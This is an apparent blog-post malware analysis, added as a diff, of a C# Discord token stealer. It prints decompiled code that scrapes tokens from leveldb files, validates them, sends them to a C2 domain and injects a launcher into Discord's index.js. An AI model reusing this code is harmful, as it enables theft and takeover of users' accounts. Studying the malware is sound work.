@@ -1,0 +1,159 @@
+LOGGING DISCORD TOKENS
+
+by August GL (live from the American Dream) augustgl@protonmail.ch github.com/augustgl
+
+Let's talk about discord for a second. At this point, odds are you have heard of it. Not too long after Microsoft murdered skype (which proceeded to die), Discord was created.
+It was first advertised as a "chat for gamers" and that's more or less what it still is, except it expanded to everyone. You can either talk to somebody directly in DMs
+Or join a server, which is basically a large group chat with different channels to talk in. They have servers for every topic. I myself have struggled with mental health issues my whole life, and have actually reached out to different servers to help cope with it.
+
+But, like any messaging platform, people decide to conduct their illegal activities there. Discord is NOT cool with that. Let's take a look at their statement on law enforcement, from their privacy policy. 
+
+"Legal Requirements: We may disclose your information if required to do so by law or in the good faith belief that such action is necessary to (i) comply with a legal obligation, (ii) protect and defend the rights or property of the Company or Related Companies, (iii) protect the personal safety of users of the Services or the public, or (iv) protect against legal liability."
+
+Yes, they will comply with law enforcement. This is a double edged sword, because they put really bad people who do bad, bad things over the internet behind bars, but they also help the FBI investigate people like you or I. It's a dilemma, but that's not the point of the article. 
+
+Somebody sent something called a "token logger" to a server I was in randomly. Now, there's basically no documentation that I could find about Discord tokens, but it's a randomly generated key linked to your account. If somebody steals your discord token, they can then control your account. But that isn't enough, because you still have to get around 2fa. Well, the malware does exactly that. Now, whoever made this malware did NOT protect it enough, because it was written in C# (decompiled in like .2 seconds) and it wasn't packed, or encrypted at all. I had the code. Let's read it.
+
+Essentially it logs the token and then reports it back to the C2 server. Unfortunately, we don't have the C2 source code, because it was hosted on a web server and we had no way to access it, but the client says everything we need to know anyway. It reports it back using a POST request. Here's the code for sending it back. 
+
+HttpResponseMessage result = TokenDiscovery._httpClient.PostAsync("https://arsenite.xyz/logger/" + Config.Id + "/report", new StringContent("{\"token\":\"" + token + "\"}", Encoding.UTF8, "application/json")).Result;
+
+Cool, it sets everything up as JSON and then sends it using an HTTP POST request. Not hard to figure out the directory tree of the server side tho. It then verifies that the tokens were legit like this:
+
+
+
+
+HttpResponseMessage result = new HttpClient
+{
+	DefaultRequestHeaders = 
+	{
+		{
+			"Authorization",
+			value
+		}
+	}
+}.GetAsync("https://discord.com/api/v8/users/@me").Result;
+bool flag = result.StatusCode == HttpStatusCode.OK;
+if (flag)
+{
+	string result2 = result.Content.ReadAsStringAsync().Result;
+	dictionary[ulong.Parse(TokenDiscovery.Extract(result2, "\"id\":", ',').Replace("\"", ""))] = value;
+}
+
+
+
+
+
+Very nice, using the discord API to check if the token is valid or not. That's a sneaky way of doing it. Dickhead...
+
+
+
+
+
+public static List<string> FindTokens(string path)
+{
+	List<string> list = new List<string>();
+	foreach (string text in Directory.GetFiles(path + "\\Local Storage\\leveldb"))
+	{
+		bool flag = text.EndsWith(".log") || text.EndsWith(".ldb");
+		if (flag)
+		{
+			try
+			{
+				string text2 = text + "-c";
+				bool flag2 = File.Exists(text2);
+				if (flag2)
+				{
+					File.Delete(text2);
+				}
+				File.Copy(text, text2);
+				string input = File.ReadAllText(text2);
+				foreach (object obj in Regex.Matches(input, "mfa\\.(\\w|\\d|_|-){84}"))
+				{
+					Match match = (Match)obj;
+					list.Add(match.Value);
+				}
+				foreach (object obj2 in Regex.Matches(input, "(\\w|\\d){24}\\.(\\w|\\d|_|-){6}.(\\w|\\d|_|-){27}"))
+				{
+					Match match2 = (Match)obj2;
+					list.Add(match2.Value);
+				}
+			}
+			catch
+			{
+			}
+		}
+	}
+	return list.Distinct<string>().ToList<string>();
+}
+
+This code is a bit harder to understand. Discord is essentially just google chrome (you can actually access google chrome's inspect element through discord), so it stores everything in a folder called leveldb. based off of this, that seems like where the discord tokens are kept. Then it sifts out the data with Regex. So that's the code for stealing the tokens. I'm gonna look into the main file.
+
+There's a lot to go through in here. First things first, whoever made this wrote their own gzip function so they could zip and unzip more necessary DLLs/Executables. They were in the resources I believe, stored gzipped, and then unzipped using this short gzip function.
+
+private static byte[] GZip(byte[] compressed)
+{
+	MemoryStream stream = new MemoryStream(compressed);
+	GZipStream gzipStream = new GZipStream(stream, CompressionMode.Decompress);
+	MemoryStream memoryStream = new MemoryStream();
+	gzipStream.CopyTo(memoryStream);
+	gzipStream.Close();
+	return memoryStream.ToArray();
+}
+
+
+
+
+
+There is code to restard discord, after they disabled 2fa. It's not that important, so I won't show it. The important code is this
+
+if (flag)
+{
+	Directory.CreateDirectory(text4);
+	File.WriteAllBytes(Path.Combine(text4, "Update.exe"), Program.GZip(Program.ReadResource("Update")));
+	File.WriteAllBytes(Path.Combine(text4, "Newtonsoft.Json.dll"), Program.GZip(Program.ReadResource("Json")));
+	File.WriteAllText(Path.Combine(text4, "Config.json"), string.Concat(new string[]
+	{
+		"{\"id\":\"",
+		Config.Id,
+		"\",\"disable_2fa\":",
+		Config.Disable2fa.ToString().ToLower(),
+		",\"versions\":{}}"
+	}));
+	char c = '"';
+	File.WriteAllText(text2 + "/index.js", string.Format("const child_process = require('child_process');\r\nchild_process.execSync(`{0}${{__dirname}}/{1}/Update.exe{2}`);\r\nrequire(__dirname + '/{3}/inject.js');\r\n\r\nmodule.exports = require('./core.asar');", new object[]
+	{
+		c,
+		text3,
+		c,
+		text3
+	}));
+	bool silent = Config.Silent;
+	if (silent)
+	{
+		foreach (string token in TokenDiscovery.CheckTokens(TokenDiscovery.FindTokens(path)))
+		{
+			TokenDiscovery.ReportToken(token);
+		}
+	}
+	else
+	{
+		Program.Restart(path, text);
+	}
+}
+
+
+Very clever. Editing a configuration file for discord to disabled 2FA. Sending the token, and then restarting discord. Whoever did this was intelligent enough to figure something like that out, and it's a new way to bypass 2FA, which is basically impossible, so I'll give him that. At least that's what it looks like it's doing. Obviously, discord doesn't want us to know too much about how they operate, so documentation is limited. There's a config.cs file, but there's not much in it. In the executable's resources, there were two more binary files that got unzipped. One was a library for JSON, and one was an Update.exe file. I can't go much more into it, because we have limited page space, but the code is on my github. If you believe I have made any mistakes in this article or interpreting this code, please reach out to me. 
+
+The logger was stored on the domain arsenite.xyz
+Currently I cannot access it. I believe they took it down after the source was leaked.
+
+HOW TO REVERSE ENGINEER .NET EXECUTABLES (C#, VISUAL BASIC)
+1. download dnSpy from github, or some other .NET decompiler
+2. open the executable in dnSpy (or other .NET decompiler)
+3. congrats you did it. 
+(THIS WILL NOT WORK IF THE EXECUTABLE IS NATIVE (C++, C) AND NOT .NET, so make sure you check!)
+
+github.com/augustgl/arsenite.xyz
+
+Good luck in this foul year of our lord, 2021
